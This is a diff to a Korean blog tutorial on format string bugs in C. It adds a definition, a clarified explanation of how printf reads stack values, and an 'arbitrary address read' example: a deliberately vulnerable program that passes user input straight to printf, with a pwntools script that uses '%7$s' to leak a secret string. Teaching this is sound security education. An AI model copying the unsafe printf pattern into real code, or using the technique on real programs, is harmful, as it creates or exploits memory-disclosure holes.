@@ -8,6 +8,8 @@ comments: true
 
 ## Format String에 대하여
 
+> 포맷 스트링(Format String): printf 계열 함수의 첫 번째 인자로 전달되는, %d, %p, %s 등의 포맷 지정자를 포함한 문자열
+
 - %d : 값을 입력하면 10진수를 출력
 - %s : 포인터를 입력하면 해당 포인터에 위치하는 null바이트로 끝나는 문자열을 출력
 - %x : 값을 입력하면 16진수로 출력
@@ -43,7 +45,7 @@ printf("%5$p");         // Format string bug : 8번째 parameter에 해당하는
 
 ![FSB]({{site.url}}/img/FSB.png)
 
-위의 그림을 보자. 보통 왼쪽의 형식으로 printf를 사용하지만, 만약 오른쪽의 형식으로 잘못 사용할 경우, printf (혹은 기타 포맷 스트링 사용 함수들)는 기존의 방식대로 값을 참조하기 때문에, 포맷 스트링 개수만큼 main 함수의 스택 내용을 임의로 참조하게 된다. 이를 사용하여 FSB 해킹을 진행하게 된다. printf의 parameter 개수는 format string 개수로 결정된다.
+위의 그림을 보자. 보통 왼쪽의 형식으로 printf를 사용하지만, 만약 오른쪽의 형식으로 잘못 사용할 경우, printf (혹은 기타 포맷 스트링 사용 함수들)는 기존의 방식대로 값을 참조하기 때문에, **Format string 안에 있는 Format specifier의 개수(%p, %d, %s..)만큼 main 함수의 스택 내용을 임의로 참조**하게 된다. 이를 사용하여 FSB 해킹을 진행하게 된다. printf의 parameter 개수는 Format string specifier 개수로 결정된다.
 
 <br/>
 
@@ -141,4 +143,41 @@ printf("%p %p %p", a, b, c);
 //      ↑           ↑  ↑  ↑
 //     rdi         rsi rdx rcx
 //  (포맷 해석용)  (1번째 %p) (2번째 %p) (3번째 %p)
+```
+
+이제 해커의 시선으로 보자. 6번째 출력값인 `[rsp]` 부터는 사용자의 입력값을 8글자씩 참조하기 시작하는데, 이를 응용하면 원하는 주소를 넣고 읽거나 쓰는 것이 가능하다.
+
+### Example Code 2 : 임의 주소 읽기 (2026.05.12 추가)
+
+```c
+#include <stdio.h>
+
+const char* secret = "THIS IS SECRET";
+
+int main(){
+        char format[0x100];
+
+        printf("Address of `secret`: %p\n", secret);
+        printf("Format: ");
+        scanf("%[^\n]", format);
+        printf(format);
+        return 0;
+}
+```
+
+여기서 `secret`의 주소를 처음에 출력해주므로, Payload에 해당 주소를 넣어주고, **`%[n]$s`의 형식으로 스택에 저장된 Payload의 `secret`의 주소를 문자열 형식으로 읽을 수 있다**.
+
+```python
+from pwn import *
+
+p = process('./fsb_aar')
+
+p.recvuntil('`secret`: ')
+secret_addr = int(p.recvline()[:-1].decode(),16)
+
+fstring = b'%7$s'.ljust(8)
+fstring += p64(secret_addr)
+
+p.sendline(fstring)
+p.interactive()
 ```
